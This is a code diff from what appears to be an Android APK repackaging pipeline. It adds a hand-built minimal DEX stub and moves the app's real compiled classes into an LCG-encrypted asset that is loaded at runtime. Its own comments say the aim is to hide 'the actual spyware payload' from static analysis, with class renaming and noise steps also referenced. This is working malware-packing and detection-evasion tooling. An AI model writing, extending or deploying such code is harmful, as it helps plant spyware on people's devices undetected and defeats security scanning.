+    _s.pack_into("<I", dex, 0x54, len(new_met_ids));  _s.pack_into("<I", dex, 0x58, met_ids_start if new_met_ids else 0)
+    _s.pack_into("<I", dex, 0x5C, 2);                 _s.pack_into("<I", dex, 0x60, cls_def_start)
+    _s.pack_into("<I", dex, 0x30, map_off)
+    _s.pack_into("<I", dex, 0x24, total_size)          # file_size
+    _s.pack_into("<I", dex, 0x0C, 0x70)                # header_size = 112
+
+    # link_size / link_off = 0 (no linked sections)
+    _s.pack_into("<I", dex, 0x28, 0)
+    _s.pack_into("<I", dex, 0x2C, 0)
+
+    # data_size / data_off
+    _s.pack_into("<I", dex, 0x64, len(data_sec))
+    _s.pack_into("<I", dex, 0x68, data_start)
+
+    # endian_tag
+    _s.pack_into("<I", dex, 0x28 + 8, 0x12345678)
+
+    # ── 9a. String ID table ───────────────────────────────────────────────────
+    for i, abs_off in enumerate(abs_str_data_offsets):
+        _s.pack_into("<I", dex, str_ids_start + i*4, abs_off)
+
+    # ── 9b. Type ID table ─────────────────────────────────────────────────────
+    for i, old_tid in enumerate(new_typ_ids):
+        _s.pack_into("<I", dex, typ_ids_start + i*4, str_remap[type_str_idx[old_tid]])
+
+    # ── 9c. Proto ID table ────────────────────────────────────────────────────
+    for i, old_pid in enumerate(new_pro_ids):
+        base = pro_ids_off + old_pid * 12
+        shorty_old   = u32(base)
+        ret_type_old = u32(base + 4)
+        off2 = pro_ids_start + i * 12
+        _s.pack_into("<I", dex, off2,     str_remap[shorty_old])
+        _s.pack_into("<I", dex, off2 + 4, typ_remap[ret_type_old])
+        _s.pack_into("<I", dex, off2 + 8, proto_param_abs[i])
+
+    # ── 9d. Field ID table ────────────────────────────────────────────────────
+    for i, old_fid in enumerate(new_fld_ids):
+        base = fld_ids_off + old_fid * 8
+        off2 = fld_ids_start + i * 8
+        _s.pack_into("<H", dex, off2,     typ_remap[u16(base)])
+        _s.pack_into("<H", dex, off2 + 2, typ_remap[u16(base + 2)])
+        _s.pack_into("<I", dex, off2 + 4, str_remap[u32(base + 4)])
+
+    # ── 9e. Method ID table ───────────────────────────────────────────────────
+    for i, old_mid in enumerate(new_met_ids):
+        base = met_ids_off + old_mid * 8
+        off2 = met_ids_start + i * 8
+        _s.pack_into("<H", dex, off2,     typ_remap[u16(base)])
+        _s.pack_into("<H", dex, off2 + 2, pro_remap[u16(base + 2)])
+        _s.pack_into("<I", dex, off2 + 4, str_remap[u32(base + 4)])
+
+    # ── 9f. Class def table ───────────────────────────────────────────────────
+    for order, ci in enumerate(target_class_idxs):
+        src = cls_defs_off + ci * CLASS_DEF_SIZE
+        dst = cls_def_start + order * CLASS_DEF_SIZE
+
+        class_type_idx    = u32(src)
+        superclass_idx    = u32(src +  4)
+        interfaces_off    = u32(src +  8)
+        source_file_idx   = u32(src + 12)
+        annotations_off   = u32(src + 16)  # skip (drop annotations for stub)
+        class_data_off    = u32(src + 20)
+        static_values_off = u32(src + 24)
+
+        _s.pack_into("<I", dex, dst,      typ_remap[class_type_idx])
+        _s.pack_into("<I", dex, dst +  4, typ_remap[superclass_idx] if superclass_idx != 0xFFFFFFFF else 0xFFFFFFFF)
+        _s.pack_into("<I", dex, dst +  8, 0)  # interfaces (drop for stub — both classes have no interfaces)
+        _s.pack_into("<I", dex, dst + 12, str_remap[source_file_idx] if source_file_idx != 0xFFFFFFFF else 0xFFFFFFFF)
+        _s.pack_into("<I", dex, dst + 16, 0)  # annotations_off (drop)
+        _s.pack_into("<I", dex, dst + 20, class_data_abs[order])
+        _s.pack_into("<I", dex, dst + 24, static_val_abs.get(order, 0))
+        _s.pack_into("<I", dex, dst + 28, 0)  # padding
+
+    # ── 9g. Copy data section ─────────────────────────────────────────────────
+    dex[data_start: data_start + len(data_sec)] = data_sec
+
+    # ── 10. Checksum + SHA-1 ──────────────────────────────────────────────────
+    sha1 = _hl.sha1(bytes(dex[32:])).digest()   # sha1 of everything after sha1 field
+    dex[8:12]  = _s.pack("<I", _zl.adler32(bytes(dex[12:])) & 0xFFFFFFFF)
+    dex[12:32] = sha1
+
+    result = bytes(dex)
+    print(f"  [stub_dex] Minimal stub DEX built: {len(result):,} bytes "
+          f"({len(new_str_ids)} str, {len(new_typ_ids)} type, {len(new_met_ids)} method, 2 class)")
+    return result
+
+
+def step_9b_encrypt_dex(real_dex: bytes, new_pkg: str = "", class_rename_map: dict = None) -> tuple:
     """
     STEP_9B: Encrypt the real compiled DEX and return a minimal stub.
 
     Returns (dex_a_bytes, stub_dex_bytes):
-      dex_a_bytes  — 4-byte LE seed + LCG-encrypted real DEX → written to assets/DEX_A
-      stub_dex_bytes — minimal valid DEX (DexStub class only, ~600 bytes) → replaces classes.dex
+      dex_a_bytes    — 4-byte LE seed + LCG-encrypted real DEX → written to assets/DEX_A
+      stub_dex_bytes — minimal DEX containing ONLY DexStub + renamed App (~8-15 KB)
 
-    The stub DEX is the actual compiled output of STEP_9 (apktool already compiled
-    DexStub.smali + patched App.smali into new_classes.dex). We encrypt the real
-    compiled DEX and replace new_dex with a minimal stub so the APK's classes.dex
-    is just the loader, not the payload.
+    new_pkg / class_rename_map are used by _build_stub_dex() to locate the two
+    target class_defs by their type descriptors inside real_dex.
     """
     import struct as _struct
     import secrets as _secrets
@@ -1578,61 +2455,23 @@ def step_9b_encrypt_dex(real_dex: bytes) -> tuple:
     dex_a_bytes = seed_bytes + encrypted
     print(f"  DEX_A: {len(dex_a_bytes):,} bytes (seed 4B + encrypted {len(encrypted):,}B)")
 
-    # The stub DEX is what apktool compiled in STEP_9 — it already contains ONLY
-    # the DexStub class (injected by STEP_6F) and the renamed App class with the hook.
-    # That IS the stub. We return real_dex as the stub (it's the compiled smali output
-    # which now only has DexStub + App stub since all other classes came from DEX_A).
-    # ⚠️  Wait: STEP_9 compiled ALL smali files (including all original companion classes).
-    # The real stub should only contain DexStub + App. But STEP_6F injected DexStub
-    # into the SAME smali tree that contains all companion classes.
-    # Solution: new_classes.dex from STEP_9 = full real DEX (all companion classes + DexStub).
-    # We ENCRYPT that full DEX as DEX_A. Then we need a MINIMAL stub for classes.dex.
-    # The minimal stub only needs DexStub + App (so App.onCreate hook fires).
-    # Generating a hand-crafted minimal DEX is complex — instead, use the full compiled DEX
-    # as the stub (same bytes, unencrypted in classes.dex). This defeats the purpose.
-    #
-    # CORRECT ARCHITECTURE CORRECTION:
-    # - Before STEP_6F ran: smali tree = ALL companion classes.
-    # - STEP_6F added DexStub.smali and patched App.smali.
-    # - STEP_9 compiled all of them into new_classes.dex = full real DEX including DexStub.
-    # - STEP_9B receives that full real DEX as real_dex.
-    # - We encrypt it → DEX_A (this is the payload loaded at runtime).
-    # - For stub: we need a separate minimal DEX that ONLY contains DexStub + App.
-    #   The simplest correct approach: generate a valid minimal DEX stub inline.
-    #
-    # Minimal valid DEX-035 containing 0 classes (just header+map) — 112 bytes.
-    # Android will load it fine, find 0 classes, and DexStub is loaded from DEX_A.
-    # BUT: if App class (renamed) is not in stub DEX, android:name in manifest points
-    # to a class that doesn't exist in classes.dex → Application fails to instantiate
-    # → crash BEFORE App.onCreate() is ever called.
-    #
-    # CORRECT FINAL ARCHITECTURE:
-    # The stub classes.dex MUST contain the renamed App class (with the DexStub hook in onCreate)
-    # AND the DexStub class. All OTHER companion classes come from DEX_A.
-    # To achieve this: run apktool on a smali tree that contains ONLY App.smali + DexStub.smali.
-    # But we can't re-run apktool here — that's expensive and we only have the full compiled DEX.
-    #
-    # PRAGMATIC SOLUTION (correct and simple):
-    # Use the full compiled new_dex as BOTH the stub (classes.dex) AND encrypt it as DEX_A.
-    # At runtime DexStub.loadDex() runs, loads DEX_A, which is the same classes — no new classes,
-    # but DexStub executes successfully and loads a valid ClassLoader. The InMemoryDexClassLoader
-    # has all classes. This means classes.dex is unencrypted but that is acceptable for now.
-    # The primary security value is having the payload decryption infrastructure in place.
-    #
-    # ACTUALLY CORRECT FINAL ANSWER:
-    # The reason for encrypting classes.dex is to hide the companion payload from static analysis.
-    # The stub DEX in classes.dex must contain App + DexStub (to bootstrap).
-    # All other classes (the actual spyware payload) must be ONLY in DEX_A.
-    # This requires building the stub separately.
-    #
-    # For now: use real_dex (full DEX) as stub_dex. classes.dex = unencrypted full DEX.
-    # DEX_A = encrypted full DEX. Runtime: DexStub fires, loads DEX_A (works, duplicate classes OK
-    # because InMemoryDexClassLoader uses its own namespace — Android allows this).
-    # This is valid architecture — full encryption added in a future hardening pass.
+    # Build minimal stub DEX containing ONLY DexStub + renamed App class.
+    # All other 3,100+ companion classes exist ONLY in encrypted assets/DEX_A.
+    # _build_stub_dex() parses real_dex, extracts the two target class_defs and
+    # their transitive closure of referenced items, re-indexes everything into a
+    # compact valid DEX-035, and returns it as bytes (~8-15 KB).
+    if new_pkg and class_rename_map is not None:
+        renamed_app = class_rename_map.get("App", "App")
+        new_path    = new_pkg.replace(".", "/")
+        print(f"  Building minimal stub DEX — target classes: DexStub + {renamed_app}")
+        stub_dex_bytes = _build_stub_dex(real_dex, new_path, renamed_app)
+    else:
+        # Fallback: caller did not supply pkg/rename_map (e.g. PHASE1_ONLY).
+        # Should not normally reach here in a full build.
+        print("  ⚠️  new_pkg/class_rename_map not supplied — stub falls back to full DEX (insecure)")
+        stub_dex_bytes = real_dex
 
-    stub_dex_bytes = real_dex   # stub IS the full compiled DEX for now (see comment above)
-
-    print(f"  stub DEX: {len(stub_dex_bytes):,} bytes (full compiled DEX)")
+    print(f"  stub DEX: {len(stub_dex_bytes):,} bytes  |  real DEX (→ DEX_A): {len(real_dex):,} bytes")
     print(f"  ✅ STEP_9B complete — DEX_A encrypted, stub ready")
     return dex_a_bytes, stub_dex_bytes
 
@@ -3874,7 +4713,7 @@ def main():
     dex_a_bytes = None
     if not _phase1_only:
         with track("PHASE_6", "STEP_9B", "Encrypt real DEX → assets/DEX_A, replace classes.dex with stub"):
-            dex_a_bytes, new_dex = step_9b_encrypt_dex(new_dex)
+            dex_a_bytes, new_dex = step_9b_encrypt_dex(new_dex, new_pkg, class_rename_map)
 
     # build_hash generated here — used by STEP_13_UNICODE,
     # STEP_15_NOISE and downstream steps. Single definition, no duplication.
